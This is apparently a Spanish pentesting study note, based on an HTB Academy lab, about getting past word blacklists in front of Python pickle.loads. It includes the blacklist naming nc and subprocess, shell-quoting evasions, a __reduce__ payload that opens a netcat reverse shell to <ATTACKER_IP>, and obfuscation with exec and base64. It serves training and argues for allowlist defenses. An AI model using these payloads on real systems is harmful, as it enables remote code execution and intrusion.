---
tags:
  - Web/Red-Team
  - Deserializacion
  - Pentesting/Explotacion
Descripción: "Por qué las blacklists de palabras ante pickle.loads no sirven, y las técnicas para evadirlas: quoting de shell, callables alternativos y codificación de opcodes"
Fecha de actualización: 2026-11-20
Nota previa: "[[09 - Object injection y RCE en Python]]"
Nota siguiente: "[[11 - Más allá de pickle - JSONPickle, PyYAML y ruamel]]"
Area: "[[Deserialización.base|Deserialización]]"
---
---

La defensa ingenua contra la deserialización es una **blacklist**: rechazar la entrada si contiene palabras peligrosas antes de deserializarla. `HTBooks` lo hace:

```python
for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
    if badword in b:
        return None
p = pickle.loads(b)
```

<mark style="background: #FF5582A6;">Una blacklist ante un deserializador es defensa de teatro</mark>: hay infinitas formas de expresar el mismo comando y el mismo `opcode`, y el filtro solo conoce las que su autor pensó. Esta nota reúne las categorías de bypass, que se combinan entre sí.

# Nivel 1: evadir el filtro de shell

Las palabras prohibidas (`nc`, `/sh`, `/bash`) son fragmentos del comando que viajará a `os.system`. La `shell` interpreta muchas construcciones que rompen la cadena literal sin cambiar el significado:

| Técnica | `nc -e /bin/sh` se escribe... |
| --- | --- |
| Comillas intercaladas | `n''c -e /bin/s''h` |
| Variables vacías | `n${x}c -e /bin/s${x}h` |
| Concatenación | `n"c" -e "/bin"/sh` |
| Globbing | `/b?n/n?` (si solo hay un match) |
| `$IFS` como separador | `cat$IFS/etc/passwd` |
| Base64 + pipe | `echo <b64> | base64 -d | sh` |

<mark style="background: #ADCCFFA6;">Las comillas intercaladas son la técnica estrella: `n''c` es idéntico a `nc` para la `shell` (las comillas vacías se eliminan al parsear) pero no contiene la subcadena `nc` que busca el filtro</mark>. El módulo lo prueba primero con un comando inofensivo:

```shell-session
$ h'e'ad /e't'c/p'a's's'wd
root:x:0:0:root:/root:/usr/bin/zsh
...
```

Y el `payload` final queda:

```python
class RCE:
    def __reduce__(self):
        return os.system, ("n''c -nv <ATTACKER_IP> 9999 -e /bin/s''h",)
```

El repositorio [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md) mantiene el catálogo exhaustivo de estos bypass de inyección de comandos, aplicables tal cual aquí.

# Nivel 2: evitar el callable prohibido

Cuando el filtro no veta el comando sino el **callable** (`subprocess`, `Popen`), la salida es usar otro. El mismo objetivo —ejecutar un comando— se alcanza por muchos caminos, y la blacklist solo conoce los nombres que listó:

| Callable | Uso en `__reduce__` |
| --- | --- |
| `os.system` | `return os.system, ("cmd",)` |
| `os.popen` | `return os.popen, ("cmd",)` — con `.read()` para leer salida |
| `subprocess.check_output` | `return subprocess.check_output, (["cmd"],)` |
| `subprocess.call` | alternativa a `Popen` |
| `pty.spawn` | reverse shell interactiva |
| `builtins.exec` | `return exec, ("código python",)` — ejecuta Python, no shell |
| `builtins.eval` | evalúa una expresión |

<mark style="background: #8000E1A6;">El salto conceptual: si `subprocess` está vetado, `os.system` sirve igual; si ambos lo están, `exec` ejecuta código Python que importe lo que quiera en tiempo de ejecución</mark>. `exec("__import__('os').system('cmd')")` elude cualquier filtro que busque `os` o `subprocess` como texto, porque el nombre del módulo aparece dentro de una cadena que se construye en ejecución.

# Nivel 3: ofuscar el propio bytecode

El filtro inspecciona los **bytes** del `pickle` antes de deserializarlo. Como el `pickle` es `bytecode`, se puede reescribir para que compute las cadenas prohibidas en tiempo de ejecución en lugar de contenerlas literalmente:

- **Construir la cadena con `chr()`**: en vez de `"os.system"` literal, emitir `opcodes` que concatenen `chr(111)+chr(115)+...`. La herramienta PEAS hace exactamente esto, por eso sus `payloads` son mucho más largos que los artesanales.
- **`exec` con una cadena codificada**: `exec(base64.b64decode('...'))`, donde el `base64` oculta el comando. El filtro ve `exec` y `base64` pero no el comando.
- **`opcodes` crudos**: escribir el `pickle` a mano con `pickletools` o la librería `pickleassem` para evitar patrones que el filtro reconozca.

> [!warning]+ Por qué la blacklist pierde siempre
> El espacio de representaciones equivalentes de un comando es infinito: `shell quoting`, codificaciones, callables alternativos, construcción dinámica de cadenas. Un filtro solo puede enumerar un número finito de ellas. <mark style="background: #FFB86CA6;">La conclusión no es «esta blacklist estaba mal hecha» sino «ninguna blacklist ante un deserializador puede estar bien hecha»</mark>: el problema es deserializar entrada no confiable, no las palabras que lleve. La defensa correcta está un nivel más arriba —no deserializar, o restringir por allowlist de clases en `find_class`— y se trata en [[13 - Defensa - formatos seguros y restricción de clases]].

# Caso práctico: adaptar PEAS

El módulo muestra que PEAS, generador de `payloads` Python, falla de serie contra `HTBooks` porque usa `subprocess.Popen` —ambos en la blacklist—. Para que funcione hay que editarlo y cambiar `subprocess.Popen` por `os.system`, ajustando la forma de los argumentos (`os.system` toma una cadena; `Popen` toma una lista). Es el recordatorio de que las herramientas genéricas asumen que no hay filtro: <mark style="background: #FFB8EBA6;">ante una blacklist concreta, suele ser más rápido escribir el `payload` a mano que pelearse con una herramienta</mark>. El estado actual de PEAS y alternativas vivas, en [[14 - Arsenal de herramientas de deserialización]].

> [!info]+ Fuentes
> Catálogo de bypass de inyección de comandos: [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md). Callables alternativos para `__reduce__`: documentación de [`os`](https://docs.python.org/3/library/os.html) y [`subprocess`](https://docs.python.org/3/library/subprocess.html). Caso de la blacklist de `HTBooks` del módulo 169 de HTB Academy.
